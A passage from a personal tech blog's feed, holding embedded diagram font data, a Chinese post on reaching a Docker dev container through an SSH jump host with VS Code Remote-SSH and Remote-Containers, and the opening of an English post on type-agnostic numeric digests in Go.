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)}.d2-176717286 .text-mono-bold{font-family:'d2-176717286-font-mono-bold'}@font-face{font-family:d2-176717286-font-mono-bold;src:url(data:application/font-woff;base64,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)}.d2-176717286 .text-mono-italic{font-family:'d2-176717286-font-mono-italic'}@font-face{font-family:d2-176717286-font-mono-italic;src:url(data:application/font-woff;base64,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)}.connection,.shape{stroke-linejoin:round}.shape{shape-rendering:geometricPrecision}.connection{stroke-linecap:round}.d2-176717286 .fill-N1{fill:#000410}.d2-176717286 .fill-N2{fill:#0000b8}.d2-176717286 .fill-B6{fill:#fff}.d2-176717286 .stroke-B1{stroke:#000410}</style><g id="local"><g class="shape"><path fill="#FFF" stroke="#000410" d="M0 8h92v66H0z" class="stroke-B1 fill-B6" style="stroke-width:2"/></g><text x="46" y="46.5" fill="#000410" class="text-mono-bold fill-N1" style="text-anchor:middle;font-size:16px">LOCAL</text></g><g id="'server J\n202.x.x.x'"><g class="shape"><path fill="#FFF" stroke="#000410" d="M240 0h132v82H240z" class="stroke-B1 fill-B6" style="stroke-width:2"/></g><text x="306" y="38.5" fill="#000410" class="text-mono-bold fill-N1" style="text-anchor:middle;font-size:16px"><tspan x="306" dy="0">SERVER J</tspan><tspan x="306" dy="18.5">202.X.X.X</tspan></text></g><g id="'server B\n10.x.x.x'"><g class="shape"><path fill="#FFF" stroke="#000410" d="M520 0h123v82H520z" class="stroke-B1 fill-B6" style="stroke-width:2"/></g><text x="581.5" y="38.5" fill="#000410" class="text-mono-bold fill-N1" style="text-anchor:middle;font-size:16px"><tspan x="581.5" dy="0">SERVER B</tspan><tspan x="581.5" dy="18.5">10.X.X.X</tspan></text></g><g id="(local -&gt; 'server J\n202.x.x.x')[0]"><marker id="mk-3488378134" markerHeight="12" markerUnits="userSpaceOnUse" markerWidth="10" orient="auto" refX="7" refY="6" viewBox="0 0 10 12"><path stroke-width="2" d="m0 0 10 6-10 6z" class="connection" style="fill:#000410"/></marker><path fill="none" stroke="#000410" marker-end="url(#mk-3488378134)" d="M94 41h142" class="connection stroke-B1" mask="url(#d2-176717286)" style="stroke-width:2"/><text x="166" y="47" fill="#0000B8" class="text-mono-italic fill-N2" style="text-anchor:middle;font-size:16px">JUSER</text></g><g id="('server J\n202.x.x.x' -&gt; 'server B\n10.x.x.x')[0]"><path fill="none" stroke="#000410" marker-end="url(#mk-3488378134)" d="M374 41h142" class="connection stroke-B1" mask="url(#d2-176717286)" style="stroke-width:2"/><text x="446" y="47" fill="#0000B8" class="text-mono-italic fill-N2" style="text-anchor:middle;font-size:16px">BUSER</text></g><mask id="d2-176717286" width="645" height="84" x="-1" y="-1" maskUnits="userSpaceOnUse"><path fill="#fff" d="M-1-1h645v84H-1z"/><path fill="rgba(0,0,0,0.75)" d="M22.5 30.5h47v21h-47zM262.5 22.5h87v37h-87zM542.5 22.5h78v37h-78z"/><path d="M142 31h48v21h-48zM422 31h48v21h-48z"/></mask></svg></svg></figure><p >其中 Server J 是跳板机，Server B 是目标服务器。现在需要让 VSCode 经由 Server J 连接到 Server B，并在 Server B 上使用 Remote - Containers 插件开启一个容器。</p><h2 id="设置-ssh-代理">设置 SSH 代理</h2><p >在本地的 <code>~/.ssh/config</code> 中添加如下配置：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">Host server-j</span><br><span class="line">    HostName 202.x.x.x</span><br><span class="line">    User juser</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa_juser</span><br><span class="line"></span><br><span class="line">Host server-b</span><br><span class="line">    HostName 10.x.x.x</span><br><span class="line">    User buser</span><br><span class="line">    ProxyCommand ssh -q -W %h:%p server-j</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa_buser</span><br></pre></div></div><p >此处注意：</p><ol><li>两个配置的用户名是不同的，其中使用 <code>juser</code> 从本地连接到 Server J，再使用 <code>buser</code> 从 Server J 连接到 Server B。读者可以根据实际情况修改。</li><li>两个配置的密钥文件也是不同的，分别是 <code>~/.ssh/id_rsa_juser</code> 和 <code>~/.ssh/id_rsa_buser</code>。<strong>但是这两个文件都需要存在本地。</strong>读者需要根据实际情况修改。</li><li><code>server-b</code> 和 <code>server-j</code> 是自定义的别名，可以根据实际情况修改。</li></ol><p >配置完成后，即可在 VSCode 中按 <code>Ctrl+Shift+P</code>，选择 <code>Remote-SSH: Connect to Host</code>，选中 <code>server-b</code> 一项，即可通过跳板连接到 Server B。</p><h2 id="在-server-b-使用-remote---containers">在 Server B 使用 Remote - Containers</h2><p >至此后的操作与在本地使用 Remote - Containers 没有区别。例如你可以直接在 Server B 的项目目录下新建 <code>.devcontainer.json</code> 文件，然后在 VSCode 中打开该目录，选择 <code>Reopen in Container</code> 即可。</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-punctuation">{</span></span><br><span class="line">  <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;sdcpp_dev&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="line">  <span class="hljs-attr">&quot;runArgs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;--gpus&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;all&quot;</span><span class="hljs-punctuation">]</span></span><br><span class="line"><span class="hljs-punctuation">}</span></span><br></pre></div></div><h2 id="后续">后续</h2><p >后续我会更新其他关于 DevContainers 使用的文章，讨论如下话题：</p><ul><li>如何舒服地配置 Go/C++ 的开发环境</li><li>如何配置使调试器可用</li><li><a href="/configure-http-proxy-in-devcontainer/">如何配置 HTTP 代理，使 VSCode 在容器内的网络访问畅通无阻</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Docker/">Docker</category>
      
      <category domain="https://i.hsfzxjy.site/tags/VS-Code/">VS Code</category>
      
      <category domain="https://i.hsfzxjy.site/tags/SSH/">SSH</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Jump-Proxy/">Jump Proxy</category>
      
      
      <comments>https://i.hsfzxjy.site/devcontainers-behind-jump-proxy/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Cohesive Digests for Ints and Floats</title>
      <link>https://i.hsfzxjy.site/cohesive-digests-ints-and-floats/</link>
      <guid>https://i.hsfzxjy.site/cohesive-digests-ints-and-floats/</guid>
      <pubDate>Tue, 14 Jan 2025 12:36:51 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;On developing &lt;a href=&quot;https://github.com/hsfzxjy/sdxtra&quot;&gt;sdxtra&lt;/a&gt; there comes a problem that is to calculate cohesive digests for num</description>
        
      
      
      
      <content:encoded><![CDATA[<p >On developing <a href="https://github.com/hsfzxjy/sdxtra">sdxtra</a> there comes a problem that is to calculate cohesive digests for numeric values, in a way agnostic to their types. This post discusses the problem and presents solutions in Go, though the ideas are applicable to other languages as well.</p><h2 id="the-cohesive-digesting-problem">The Cohesive Digesting Problem</h2><h3 id="numeric-values-and-their-representations">Numeric Values and Their Representations</h3><p >In most programming languages, numeric values are usually represented as various types, such as <code>float64</code>, <code>int32</code>, <code>uint64</code>, etc., to meet different requirements of precision, range, and memory usage. Internally, these types diverse in bit lengths, layouts or signedness. Therefore, even referring to the same number in math, they may have different bit representation.</p><div class="gk-code hljs" data-gk-id="BLOCK1" data-gk-title="Same number, different representations"><div class="gk-code-display"><pre><span class="gk-section gk-zip zipped" data-gk-sid="BLOCK1.SEC1" data-gk-type="zip"><span class="line"><span class="hljs-keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> (</span><br><span class="line">  <span class="hljs-string">&quot;fmt&quot;</span></span><br><span class="line">  <span class="hljs-string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br></span><span class="line"><span 